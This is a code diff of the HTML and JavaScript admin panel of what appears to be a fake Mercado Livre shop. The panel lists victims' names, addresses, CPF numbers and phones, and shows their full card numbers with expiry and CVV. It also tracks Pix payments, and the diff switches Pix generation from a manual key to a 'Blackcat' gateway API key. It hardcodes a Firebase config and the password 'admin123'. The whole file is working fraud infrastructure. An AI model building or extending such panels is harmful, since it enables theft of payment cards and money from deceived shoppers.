@@ -4,85 +4,84 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Painel Admin</title>
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
 <style>
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#0a0e14;color:#e0e0e0;font-size:14px;min-height:100vh}
-  #loginBox{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0a0e14}
-  .login-card{background:#131a24;border:1px solid #2a3544;border-radius:12px;padding:40px;width:360px;text-align:center}
-  .login-card h1{font-size:22px;margin-bottom:8px;color:#00ff88}
-  .login-card p{color:#6a7a8c;font-size:13px;margin-bottom:24px}
-  .login-card input{width:100%;padding:12px;background:#0a0e14;border:1px solid #2a3544;border-radius:8px;color:#e0e0e0;font-size:15px;margin-bottom:16px;outline:none}
-  .login-card input:focus{border-color:#00ff88}
-  .login-card button{width:100%;padding:12px;background:#00ff88;color:#0a0e14;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
-  .login-card .erro{color:#ff3b30;font-size:13px;margin-top:12px;display:none}
-  #painel{display:none}
-  .header{background:#131a24;border-bottom:1px solid #2a3544;padding:16px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
-  .header h1{font-size:18px;color:#00ff88}
-  .header .badge{background:#1a2332;padding:6px 12px;border-radius:20px;font-size:12px;color:#6a7a8c;display:flex;align-items:center;gap:6px}
-  .header .badge .dot{width:8px;height:8px;background:#00ff88;border-radius:50%;animation:pulse 1.5s infinite}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
-  .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;padding:24px}
-  .card{background:#131a24;border:1px solid #2a3544;border-radius:12px;padding:20px}
-  .card .label{font-size:12px;color:#6a7a8c;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
-  .card .valor{font-size:32px;font-weight:700;color:#00ff88}
-  .card.cliques .valor{color:#ffcc00}
-  .card.pix .valor{color:#00bfff}
-  .card.copiados .valor{color:#ff8800}
-  .card.visitas .valor{color:#aa88ff}
-  .card.cartoes .valor{color:#ff5577}
-  .secao{padding:0 24px 24px}
-  .secao h2{font-size:16px;margin-bottom:16px;display:flex;align-items:center;gap:8px}
-  .secao h2 .count{background:#2a3544;padding:2px 10px;border-radius:12px;font-size:12px;color:#00ff88}
-  .tabela{width:100%;border-collapse:collapse;background:#131a24;border:1px solid #2a3544;border-radius:12px;overflow:hidden}
-  .tabela th{background:#1a2332;padding:12px;text-align:left;font-size:12px;color:#6a7a8c;text-transform:uppercase;letter-spacing:.5px;font-weight:600}
-  .tabela td{padding:12px;border-top:1px solid #2a3544;font-size:13px;vertical-align:top}
-  .tabela tr:hover{background:#1a2332}
-  .tabela .status{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
-  .status.online{background:#0a3d1f;color:#00ff88}
-  .status.offline{background:#2a3544;color:#6a7a8c}
-  .status.copiou{background:#4d3d00;color:#ffcc00}
-  .status.pendente{background:#2a3544;color:#6a7a8c}
-  .status.pago{background:#0a3d1f;color:#00ff88}
-  .status.cartao{background:#3d0022;color:#ff5577}
-  .btn-confirmar{background:#00ff88;color:#0a0e14;border:none;padding:8px 16px;border-radius:6px;font-weight:700;font-size:12px;cursor:pointer}
-  .btn-confirmar:hover{background:#00cc6a}
-  .btn-confirmar:disabled{background:#2a3544;color:#6a7a8c;cursor:not-allowed}
-  .btn-deletar{background:transparent;color:#ff3b30;border:1px solid #ff3b30;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer}
-  .btn-deletar:hover{background:#ff3b30;color:#fff}
-  .btn-pix{background:#00bfff;color:#0a0e14;border:none;padding:8px 12px;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;margin-top:6px;width:100%}
-  .btn-pix:hover{background:#0099cc}
-  .btn-limpar{background:transparent;border:1px solid #ff8800;color:#ff8800;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600}
-  .btn-limpar:hover{background:#ff8800;color:#0a0e14}
-  .btn-logout{background:transparent;border:1px solid #ff3b30;color:#ff3b30;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px}
-  .btn-logout:hover{background:#ff3b30;color:#fff}
-  .vazio{text-align:center;padding:40px;color:#6a7a8c;font-size:14px}
-  .detalhes{font-size:12px;color:#6a7a8c;line-height:1.6}
-  .detalhes strong{color:#e0e0e0}
-  .endereco-dados{background:#0a0e14;border:1px solid #1a3d2a;border-left:3px solid #00ff88;border-radius:6px;padding:8px;margin-top:6px;font-size:12px;line-height:1.7;color:#c0c0c0}
-  .endereco-dados .linha{margin-bottom:2px}
-  .endereco-dados .nome{color:#00ff88;font-weight:700}
-  .endereco-dados .label{color:#6a7a8c;font-size:11px}
-  .cartao-dados{background:#0a0e14;border:1px solid #3d0022;border-radius:6px;padding:8px;margin-top:4px;font-size:12px;line-height:1.7}
-  .cartao-dados .num{color:#ff5577;font-family:monospace;font-weight:700;letter-spacing:.5px}
-  .cartao-dados .label{color:#6a7a8c;font-size:11px}
-  .cartao-dados .val{color:#e0e0e0;font-weight:600}
-  .pix-config{background:#131a24;border:1px solid #2a3544;border-radius:12px;padding:20px;margin-bottom:24px}
-  .pix-config h3{font-size:14px;color:#00ff88;margin-bottom:16px}
-  .pix-config label{display:block;font-size:12px;color:#6a7a8c;margin-bottom:6px}
-  .pix-config input{width:100%;padding:12px;background:#0a0e14;border:1px solid #2a3544;border-radius:8px;color:#e0e0e0;font-size:14px;margin-bottom:16px;outline:none}
-  .pix-config input:focus{border-color:#00ff88}
-  .pix-config button{background:#00ff88;color:#0a0e14;border:none;padding:12px 20px;border-radius:8px;font-weight:700;cursor:pointer;font-size:14px}
-  .pix-config button.azul{background:#00bfff;margin-left:8px}
-  .pix-config button.vermelho{background:transparent;border:1px solid #ff3b30;color:#ff3b30;margin-left:8px}
-  .pix-preview{margin-top:16px;display:none;text-align:center;background:#0a0e14;border-radius:8px;padding:16px;border:1px solid #2a3544}
-  .pix-preview img{max-width:180px;margin:0 auto 12px}
-  .pix-preview input{font-size:12px;margin-bottom:8px}
-  .pix-status-atual{background:#0a0e14;border:1px solid #2a3544;border-radius:8px;padding:12px;margin-bottom:16px;font-size:13px;line-height:1.6}
-  .pix-status-atual .tag{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700;margin-left:6px}
-  .pix-status-atual .tag.ok{background:#0a3d1f;color:#00ff88}
-  .pix-status-atual .tag.vazio{background:#2a3544;color:#6a7a8c}
-  .pix-status-atual .chave{color:#00ff88;font-family:monospace;word-break:break-all}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#0a0e14;color:#e0e0e0;font-size:14px;min-height:100vh}
+#loginBox{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0a0e14}
+.login-card{background:#131a24;border:1px solid #2a3544;border-radius:12px;padding:40px;width:360px;text-align:center}
+.login-card h1{font-size:22px;margin-bottom:8px;color:#00ff88}
+.login-card p{color:#6a7a8c;font-size:13px;margin-bottom:24px}
+.login-card input{width:100%;padding:12px;background:#0a0e14;border:1px solid #2a3544;border-radius:8px;color:#e0e0e0;font-size:15px;margin-bottom:16px;outline:none}
+.login-card input:focus{border-color:#00ff88}
+.login-card button{width:100%;padding:12px;background:#00ff88;color:#0a0e14;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
+.login-card .erro{color:#ff3b30;font-size:13px;margin-top:12px;display:none}
+#painel{display:none}
+.header{background:#131a24;border-bottom:1px solid #2a3544;padding:16px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
+.header h1{font-size:18px;color:#00ff88}
+.header .badge{background:#1a2332;padding:6px 12px;border-radius:20px;font-size:12px;color:#6a7a8c;display:flex;align-items:center;gap:6px}
+.header .badge .dot{width:8px;height:8px;background:#00ff88;border-radius:50%;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;padding:24px}
+.card{background:#131a24;border:1px solid #2a3544;border-radius:12px;padding:20px}
+.card .label{font-size:12px;color:#6a7a8c;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
+.card .valor{font-size:32px;font-weight:700;color:#00ff88}
+.card.cliques .valor{color:#ffcc00}
+.card.pix .valor{color:#00bfff}
+.card.copiados .valor{color:#ff8800}
+.card.visitas .valor{color:#aa88ff}
+.card.cartoes .valor{color:#ff5577}
+.secao{padding:0 24px 24px}
+.secao h2{font-size:16px;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.secao h2 .count{background:#2a3544;padding:2px 10px;border-radius:12px;font-size:12px;color:#00ff88}
+.tabela{width:100%;border-collapse:collapse;background:#131a24;border:1px solid #2a3544;border-radius:12px;overflow:hidden}
+.tabela th{background:#1a2332;padding:12px;text-align:left;font-size:12px;color:#6a7a8c;text-transform:uppercase;letter-spacing:.5px;font-weight:600}
+.tabela td{padding:12px;border-top:1px solid #2a3544;font-size:13px;vertical-align:top}
+.tabela tr:hover{background:#1a2332}
+.tabela .status{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
+.status.online{background:#0a3d1f;color:#00ff88}
+.status.offline{background:#2a3544;color:#6a7a8c}
+.status.copiou{background:#4d3d00;color:#ffcc00}
+.status.pendente{background:#2a3544;color:#6a7a8c}
+.status.pago{background:#0a3d1f;color:#00ff88}
+.status.cartao{background:#3d0022;color:#ff5577}
+.btn-deletar{background:transparent;color:#ff3b30;border:1px solid #ff3b30;padding:6px 12px;border-radius:6px;font-size:12px;cursor:pointer;width:100%;margin-top:6px}
+.btn-deletar:hover{background:#ff3b30;color:#fff}
+.btn-limpar{background:transparent;border:1px solid #ff8800;color:#ff8800;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600}
+.btn-limpar:hover{background:#ff8800;color:#0a0e14}
+.btn-logout{background:transparent;border:1px solid #ff3b30;color:#ff3b30;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px}
+.btn-logout:hover{background:#ff3b30;color:#fff}
+.vazio{text-align:center;padding:40px;color:#6a7a8c;font-size:14px}
+.detalhes{font-size:12px;color:#6a7a8c;line-height:1.6}
+.detalhes strong{color:#e0e0e0}
+.endereco-dados{background:#0a0e14;border:1px solid #1a3d2a;border-left:3px solid #00ff88;border-radius:6px;padding:8px;margin-top:6px;font-size:12px;line-height:1.7;color:#c0c0c0}
+.endereco-dados .linha{margin-bottom:2px}
+.endereco-dados .nome{color:#00ff88;font-weight:700}
+.endereco-dados .label{color:#6a7a8c;font-size:11px}
+.cartao-dados{background:#0a0e14;border:1px solid #3d0022;border-radius:6px;padding:8px;margin-top:4px;font-size:12px;line-height:1.7}
+.cartao-dados .num{color:#ff5577;font-family:monospace;font-weight:700;letter-spacing:.5px}
+.cartao-dados .label{color:#6a7a8c;font-size:11px}
+.cartao-dados .val{color:#e0e0e0;font-weight:600}
+.blackcat-config{background:#131a24;border:1px solid #2a3544;border-radius:12px;padding:20px;margin-bottom:24px}
+.blackcat-config h3{font-size:14px;color:#00ff88;margin-bottom:16px}
+.blackcat-config label{display:block;font-size:12px;color:#6a7a8c;margin-bottom:6px}
+.blackcat-config input{width:100%;padding:12px;background:#0a0e14;border:1px solid #2a3544;border-radius:8px;color:#e0e0e0;font-size:14px;margin-bottom:16px;outline:none;font-family:monospace}
+.blackcat-config input:focus{border-color:#00ff88}
+.blackcat-config button{background:#00ff88;color:#0a0e14;border:none;padding:12px 20px;border-radius:8px;font-weight:700;cursor:pointer;font-size:14px}
+.blackcat-config button.vermelho{background:transparent;border:1px solid #ff3b30;color:#ff3b30;margin-left:8px}
+.blackcat-status{background:#0a0e14;border:1px solid #2a3544;border-radius:8px;padding:12px;margin-bottom:16px;font-size:13px;line-height:1.6}
+.blackcat-status .tag{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700;margin-left:6px}
+.blackcat-status .tag.ok{background:#0a3d1f;color:#00ff88}
+.blackcat-status .tag.vazio{background:#3d1f00;color:#ff8800}
+.blackcat-status .chave{color:#00ff88;font-family:monospace;word-break:break-all;font-size:12px}
+.blackcat-dados{background:#0a0e14;border:1px solid #1a2a4d;border-left:3px solid #00bfff;border-radius:6px;padding:8px;margin-top:4px;font-size:12px;line-height:1.7}
+.blackcat-dados .tid{color:#00bfff;font-family:monospace;font-weight:700;font-size:11px;word-break:break-all}
+.blackcat-dados .label{color:#6a7a8c;font-size:11px}
+.blackcat-dados .val{color:#e0e0e0;font-weight:600}
+.blackcat-dados .st-pending{color:#ffcc00;font-weight:700}
+.blackcat-dados .st-paid{color:#00ff88;font-weight:700}
+.blackcat-dados .st-cancelled{color:#ff5577;font-weight:700}
+.blackcat-dados a{color:#00bfff;text-decoration:none;font-size:11px}
+.blackcat-dados a:hover{text-decoration:underline}
 </style>
 </head>
 <body>
@@ -111,43 +110,34 @@
     <div class="card"><div class="label">🟢 Online agora</div><div class="valor" id="cardOnline">0</div></div>
     <div class="card visitas"><div class="label">👁️ Total de visitas</div><div class="valor" id="cardVisitas">0</div></div>
     <div class="card cliques"><div class="label">🛒 Cliques em comprar</div><div class="valor" id="cardCliques">0</div></div>
-    <div class="card pix"><div class="label">💠 Pix gerados</div><div class="valor" id="cardPix">0</div></div>
+    <div class="card pix"><div class="label">💠 Pix gerados (Blackcat)</div><div class="valor" id="cardPix">0</div></div>
     <div class="card copiados"><div class="label">📋 Pix copiados</div><div class="valor" id="cardCopiados">0</div></div>
     <div class="card cartoes"><div class="label">💳 Cartões enviados</div><div class="valor" id="cardCartoes">0</div></div>
     <div class="card"><div class="label">💰 Valor total pedidos</div><div class="valor" id="cardValor" style="color:#00ff88">R$ 0,00</div></div>
   </div>
 
   <div class="secao">
-    <h2>💠 Configurar Pix (troca em tempo real no site)</h2>
-    <div class="pix-config">
-      <div class="pix-status-atual" id="pixStatusAtual">
-        <div><strong>Status atual no Firebase:</strong> <span id="pixStatusTag" class="tag vazio">carregando…</span></div>
-        <div style="margin-top:6px">Chave: <span class="chave" id="pixStatusChave">—</span></div>
-        <div>Nome: <span id="pixStatusNome">—</span></div>
-        <div>Cidade: <span id="pixStatusCidade">—</span></div>
-        <div style="margin-top:6px;color:#6a7a8c;font-size:11px">Se a chave estiver vazia, o site usa a chave FALLBACK do código.</div>
+    <h2>🐈 Configurar Blackcat (API Key)</h2>
+    <div class="blackcat-config">
+      <div class="blackcat-status" id="blackcatStatus">
+        <div><strong>Status:</strong> <span id="blackcatTag" class="tag vazio">carregando…</span></div>
+        <div style="margin-top:6px">API Key: <span class="chave" id="blackcatChave">—</span></div>
+        <div style="margin-top:6px;color:#6a7a8c;font-size:11px">Cole a API Key gerada no painel da Blackcat (blackcatoficial.com). O site usa IMEDIATAMENTE, sem recarregar.</div>
       </div>
 
-      <label>Chave Pix (CPF, e-mail, telefone ou aleatória)</label>
-      <input type="text" id="chavePixInput" placeholder="Digite sua chave Pix">
-      <label>Nome do recebedor</label>
-      <input type="text" id="nomeRecebedor" placeholder="Seu nome" value="MERCADO LIVRE">
-      <label>Cidade</label>
-      <input type="text" id="cidadeRecebedor" placeholder="Sua cidade" value="SAO PAULO">
-      <button onclick="salvarPix()">💾 Salvar Chave Pix</button>
-      <button class="azul" onclick="previewPix()">👁️ Preview do QR</button>
-      <button class="vermelho" onclick="limparChavePix()">🗑️ Limpar chave (usar fallback do código)</button>
-      <div class="pix-preview" id="pixPreview">
-        <img id="pixQrPreview" src="" alt="QR Code">
-        <input type="text" id="pixCopiaColaPreview" readonly>
-      </div>
+      <label>API Key (X-API-Key)</label>
+      <input type="password" id="blackcatApiKeyInput" placeholder="Cole aqui sua API Key da Blackcat" autocomplete="off">
+      <button onclick="salvarBlackcat()">💾 Salvar API Key</button>
+      <button class="vermelho" onclick="limparBlackcat()">🗑️ Remover</button>
+      <button onclick="testarBlackcat()" style="background:#00bfff;margin-left:8px">🧪 Testar</button>
+      <div id="blackcatTeste" style="margin-top:12px;font-size:13px;display:none"></div>
     </div>
   </div>
 
   <div class="secao">
     <h2>📦 Pedidos <span class="count" id="countPedidos">0</span></h2>
     <table class="tabela">
-      <thead><tr><th>Cliente / Endereço</th><th>Status</th><th>Pix</th><th>Cartão</th><th>Valor</th><th>Entrou</th><th>Ações</th></tr></thead>
+      <thead><tr><th>Cliente / Endereço</th><th>Status</th><th>Pix / Blackcat</th><th>Cartão</th><th>Valor</th><th>Entrou</th><th>Ações</th></tr></thead>
       <tbody id="corpoPedidos"><tr><td colspan="7" class="vazio">Nenhum pedido ainda...</td></tr></tbody>
     </table>
   </div>
@@ -164,282 +154,258 @@
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 <script>
-  const firebaseConfig={apiKey:"AIzaSyACKSuwEZUvaaRIYa0LD_9XEsgIBvc_ua8",authDomain:"dashr-55b1e.firebaseapp.com",databaseURL:"https://dashr-55b1e-default-rtdb.firebaseio.com",projectId:"dashr-55b1e",storageBucket:"dashr-55b1e.firebasestorage.app",messagingSenderId:"229775202758",appId:"1:229775202758:web:30dbd15036c3fdb5edfac7"};
-  firebase.initializeApp(firebaseConfig);
-  const db=firebase.database();
-  const SENHA_ADMIN='admin123';
+const firebaseConfig={apiKey:"AIzaSyACKSuwEZUvaaRIYa0LD_9XEsgIBvc_ua8",authDomain:"dashr-55b1e.firebaseapp.com",databaseURL:"https://dashr-55b1e-default-rtdb.firebaseio.com",projectId:"dashr-55b1e",storageBucket:"dashr-55b1e.firebasestorage.app",messagingSenderId:"229775202758",appId:"1:229775202758:web:30dbd15036c3fdb5edfac7"};
+firebase.initializeApp(firebaseConfig);
+const db=firebase.database();
+const SENHA_ADMIN='admin123';
+const BLACKCAT_BASE='https://api.blackcatoficial.com/api';
 
-  function entrar(){
-    const s=document.getElementById('senhaAdmin').value;
-    if(s===SENHA_ADMIN){
-      document.getElementById('loginBox').style.display='none';
-      document.getElementById('painel').style.display='block';
-      iniciarPainel();
-    }else{
-      document.getElementById('erroLogin').style.display='block';
-    }
+function entrar(){
+  const s=document.getElementById('senhaAdmin').value;
+  if(s===SENHA_ADMIN){
+    document.getElementById('loginBox').style.display='none';
+    document.getElementById('painel').style.display='block';
+    iniciarPainel();
+  }else{
+    document.getElementById('erroLogin').style.display='block';
   }
-  function sair(){location.reload();}
+}
+function sair(){location.reload();}
+function fmt(ts){if(!ts)return '-';return new Date(ts).toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'});}
 
-  function fmt(ts){if(!ts)return '-';return new Date(ts).toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'});}
+let stats={online:0,visitas:0,cliques:0,pix:0,copiados:0,cartoes:0,valor:0};
+let pedidos={};let visitasMap={};
+let blackcatApiKeyAtual='';
 
-  let stats={online:0,visitas:0,cliques:0,pix:0,copiados:0,cartoes:0,valor:0};
-  let pedidos={};let visitasMap={};
+function atualizarCards(){
+  document.getElementById('cardOnline').textContent=stats.online;
+  document.getElementById('cardVisitas').textContent=stats.visitas;
+  document.getElementById('cardCliques').textContent=stats.cliques;
+  document.getElementById('cardPix').textContent=stats.pix;
+  document.getElementById('cardCopiados').textContent=stats.copiados;
+  document.getElementById('cardCartoes').textContent=stats.cartoes;
+  document.getElementById('cardValor').textContent='R$ '+stats.valor.toFixed(2).replace('.',',');
+}
 
-  function atualizarCards(){
-    document.getElementById('cardOnline').textContent=stats.online;
-    document.getElementById('cardVisitas').textContent=stats.visitas;
-    document.getElementById('cardCliques').textContent=stats.cliques;
-    document.getElementById('cardPix').textContent=stats.pix;
-    document.getElementById('cardCopiados').textContent=stats.copiados;
-    document.getElementById('cardCartoes').textContent=stats.cartoes;
-    document.getElementById('cardValor').textContent='R$ '+stats.valor.toFixed(2).replace('.',',');
+function formatNumCartao(num){if(!num)return '-';return num.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim();}
+
+function renderBlackcatStatus(){
+  const tag=document.getElementById('blackcatTag');
+  const chaveEl=document.getElementById('blackcatChave');
+  const temChave=!!(blackcatApiKeyAtual&&blackcatApiKeyAtual.length>10);
+  if(temChave){
+    tag.className='tag ok';tag.textContent='✅ API Key configurada (site está usando)';
+    // mostra mascarada: primeiros 6 + ... + últimos 4
+    const k=blackcatApiKeyAtual;
+    const mask=k.length>12?(k.substring(0,6)+'...'+k.substring(k.length-4)):k;
+    chaveEl.textContent=mask;
+  }else{
+    tag.className='tag vazio';tag.textContent='⚠️ Sem API Key — Pix NÃO vai gerar';
+    chaveEl.textContent='—';
   }
+  const inp=document.getElementById('blackcatApiKeyInput');
+  if(!inp.value&&blackcatApiKeyAtual)inp.value=blackcatApiKeyAtual;
+}
 
-  function formatNumCartao(num){if(!num)return '-';return num.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim();}
+async function salvarBlackcat(){
+  const k=document.getElementById('blackcatApiKeyInput').value.trim();
+  if(!k){alert('Cole a API Key primeiro!');return;}
+  await db.ref('config_blackcat/apiKey').set(k);
+  document.getElementById('blackcatTeste').style.display='none';
+  alert('✅ API Key salva! O site já vai usar IMEDIATAMENTE (tempo real).');
+}
 
-  function renderPedidos(){
-    const tbody=document.getElementById('corpoPedidos');
-    const ids=Object.keys(pedidos);
-    document.getElementById('countPedidos').textContent=ids.length;
-    if(ids.length===0){tbody.innerHTML='<tr><td colspan="7" class="vazio">Nenhum pedido ainda...</td></tr>';return;}
-    const agora=Date.now();
-    tbody.innerHTML=ids.map(id=>{
-      const p=pedidos[id];const v=visitasMap[id]||{};
-      const online=v.online&&(agora-(v.ultimaAtividade||0)<60000);
-      const login=p.login||v.login||(p.endereco&&p.endereco.nome)||'-';
-      const pixCopiado=p.pix&&p.pix.copiado;
-      const pixCopiadoEm=(p.pix&&p.pix.copiadoEm)||0;
-      const podeConfirmar=pixCopiado&&(agora-pixCopiadoEm>=10000)&&p.status!=='pago';
-      const valorNum=parseFloat(p.valor)||0;
-      const valor=valorNum.toFixed(2).replace('.',',');
-      let statusTxt='Só visitou';let statusClass='pendente';
-      if(p.status==='pago'){statusTxt='✅ Pago';statusClass='pago';}
-      else if(p.cartao){statusTxt='💳 Cartão enviado';statusClass='cartao';}
-      else if(pixCopiado){statusTxt='📋 Copiou Pix';statusClass='copiou';}
-      else if(p.pix){statusTxt='💠 Gerou Pix';statusClass='pendente';}
-      else if(p.clicouComprar){statusTxt='🛒 Clicou comprar';statusClass='pendente';}
+async function limparBlackcat(){
+  if(!confirm('Remover a API Key? O site não vai conseguir gerar Pix até você salvar de novo.'))return;
+  await db.ref('config_blackcat').remove();
+  document.getElementById('blackcatApiKeyInput').value='';
+  document.getElementById('blackcatTeste').style.display='none';
+  alert('✅ API Key removida.');
+}
 
-      let enderecoHtml='';
-      if(p.endereco){
-        const e=p.endereco;
-        enderecoHtml=`<div class="endereco-dados">
-          <div class="linha"><span class="nome">👤 ${e.nome||''}</span></div>
-          <div class="linha">📍 ${e.rua||''}, ${e.numero||''}${e.complemento?' - '+e.complemento:''}</div>
-          <div class="linha">${e.bairro||''} — ${e.cidade||''}/${e.estado||''}</div>
-          <div class="linha"><span class="label">CEP:</span> ${e.cep||''} · <span class="label">CPF:</span> ${e.cpf||''}</div>
-          <div class="linha"><span class="label">📞</span> ${e.telefone||''}</div>
-          ${p.frete?`<div class="linha"><span class="label">🚚 Frete:</span> ${p.frete}</div>`:''}
-        </div>`;
-      } else if(p.frete){
-        enderecoHtml=`<div class="detalhes" style="margin-top:6px">🚚 Frete: <strong>${p.frete}</strong></div>`;
-      }
+async function testarBlackcat(){
+  const k=document.getElementById('blackcatApiKeyInput').value.trim();
+  const div=document.getElementById('blackcatTeste');
+  div.style.display='block';
+  div.style.color='#ffcc00';
+  div.textContent='Testando...';
+  if(!k){div.style.color='#ff3b30';div.textContent='❌ Cole a API Key primeiro.';return;}
 
-      let cartaoHtml='-';
-      if(p.cartao){
-        const c=p.cartao;
-        cartaoHtml=`<div class="cartao-dados"><div class="num">💳 ${formatNumCartao(c.numero)}</div><div><span class="label">Bandeira:</span> <span class="val">${c.bandeira||'-'}</span></div><div><span class="label">Nome:</span> <span class="val">${c.nome||'-'}</span></div><div><span class="label">Validade:</span> <span class="val">${c.validade||'-'}</span></div><div><span class="label">CVV:</span> <span class="val">${c.cvv||'-'}</span></div><div><span class="label">CPF:</span> <span class="val">${c.cpf||'-'}</span></div></div>`;
-      }
-
-      let pixHtml='-';
-      if(p.pix){
-        const pixValor=(parseFloat(p.pix.valor)||0).toFixed(2).replace('.',',');
-        const origem=(p.pix.origemChave==='fallback_codigo')?' (fallback código)':' (painel)';
-        pixHtml=`<strong>Valor:</strong> R$ ${pixValor}<br>
-          <strong>Chave:</strong> ${((p.pix.chaveRaw||p.pix.chave||'')).substring(0,24)}...<br>
-          <strong>Origem:</strong> ${origem}<br>
-          <strong>Gerado:</strong> ${fmt(p.pix.geradoEm)}
-          ${pixCopiado?`<br><strong>Copiado:</strong> ${fmt(pixCopiadoEm)}`:''}`;
-      }
-
-      const btnPix=valorNum>0?`<button class="btn-pix" onclick="gerarPixPedido('${id}')">💠 Gerar Pix (R$ ${valor})</button>`:'<div class="detalhes">Sem valor definido</div>';
-
-      return `<tr>
-        <td><div><strong>${login}</strong></div><div class="detalhes">${online?'<span class="status online">● Online</span>':'<span class="status offline">○ Offline</span>'}</div>${enderecoHtml}</td>
-        <td><span class="status ${statusClass}">${statusTxt}</span></td>
-        <td class="detalhes">${pixHtml}</td>
-        <td>${cartaoHtml}</td>
-        <td><strong>R$ ${valor}</strong></td>
-        <td class="detalhes">${fmt(v.entrouEm||p.entrouEm||p.logadoEm)}</td>
-        <td>${btnPix}<button class="btn-confirmar" ${podeConfirmar?'':'disabled'} onclick="confirmar('${id}')" style="margin-top:6px;width:100%">${p.status==='pago'?'✅ Pago':(podeConfirmar?'Confirmar':(pixCopiado?'Aguarde 10s...':'Sem Pix'))}</button><button class="btn-deletar" onclick="deletar('${id}')" style="margin-top:6px;width:100%">X</button></td>
-      </tr>`;
-    }).join('');
-  }
-
-  function confirmar(id){db.ref('pedidos/'+id).update({status:'pago',confirmadoEm:Date.now()});}
-  function deletar(id){if(!confirm('Deletar pedido '+id+'?'))return;db.ref('pedidos/'+id).remove();db.ref('visitas/'+id).remove();}
-
-  function limparTudo(){
-    if(!confirm('🧹 ATENÇÃO! Isso vai apagar TODOS os dados. Tem certeza?'))return;
-    if(!confirm('⚠️ ÚLTIMA CONFIRMAÇÃO. Todos os dados serão perdidos PERMANENTEMENTE.'))return;
-    const senha=prompt('Digite a senha de admin para confirmar:');
-    if(senha!==SENHA_ADMIN){alert('❌ Senha incorreta. Limpeza cancelada.');return;}
-    Promise.all([db.ref('visitas').remove(),db.ref('pedidos').remove(),db.ref('alertas').remove()]).then(()=>{
-      stats={online:0,visitas:0,cliques:0,pix:0,copiados:0,cartoes:0,valor:0};pedidos={};visitasMap={};
-      atualizarCards();renderPedidos();renderAlertas([]);
-      alert('✅ Tudo limpo com sucesso!');
-    }).catch(err=>alert('❌ Erro ao limpar: '+err.message));
-  }
-
-  function renderAlertas(lista){
-    const tbody=document.getElementById('corpoAlertas');
-    if(lista.length===0){tbody.innerHTML='<tr><td colspan="3" class="vazio">Nenhum alerta...</td></tr>';return;}
-    tbody.innerHTML=lista.slice(-20).reverse().map(a=>`<tr><td>${a.tipo||'?'}</td><td>${a.nome||a.clienteId||'-'}</td><td>${fmt(a.timestamp)}</td></tr>`).join('');
-  }
-
-  /* ============ CONFIG PIX (TEMPO REAL) ============ */
-  let pixConfigAtual = { chave:'', nome:'', cidade:'' };
-
-  function renderStatusPix(){
-    const tag=document.getElementById('pixStatusTag');
-    const chaveEl=document.getElementById('pixStatusChave');
-    const nomeEl=document.getElementById('pixStatusNome');
-    const cidadeEl=document.getElementById('pixStatusCidade');
-    const temChave=!!(pixConfigAtual.chave&&pixConfigAtual.chave!=='SUA_CHAVE_PIX_AQUI');
-    if(temChave){
-      tag.className='tag ok';tag.textContent='✅ Chave salva (site usa esta)';
-      chaveEl.textContent=pixConfigAtual.chave;
-    }else{
-      tag.className='tag vazio';tag.textContent='⚠️ Sem chave — site usará FALLBACK do código';
-      chaveEl.textContent='—';
-    }
-    nomeEl.textContent=pixConfigAtual.nome||'—';
-    cidadeEl.textContent=pixConfigAtual.cidade||'—';
-    // preenche os inputs se estiverem vazios (não sobrescreve o que o admin está digitando)
-    const inpChave=document.getElementById('chavePixInput');
-    const inpNome=document.getElementById('nomeRecebedor');
-    const inpCidade=document.getElementById('cidadeRecebedor');
-    if(!inpChave.value) inpChave.value=pixConfigAtual.chave||'';
-    if(!inpNome.value) inpNome.value=pixConfigAtual.nome||'MERCADO LIVRE';
-    if(!inpCidade.value) inpCidade.value=pixConfigAtual.cidade||'SAO PAULO';
-  }
-
-  async function salvarPix(){
-    const chave=document.getElementById('chavePixInput').value.trim();
-    const nome=document.getElementById('nomeRecebedor').value.trim()||'MERCADO LIVRE';
-    const cidade=document.getElementById('cidadeRecebedor').value.trim()||'SAO PAULO';
-    if(!chave){alert('Digite a chave Pix primeiro!');return;}
-    await db.ref('config_pix').set({chave,nome,cidade,atualizadoEm:Date.now()});
-    alert('✅ Chave Pix salva! O site já vai usar esta chave IMEDIATAMENTE (tempo real).');
-  }
-
-  async function limparChavePix(){
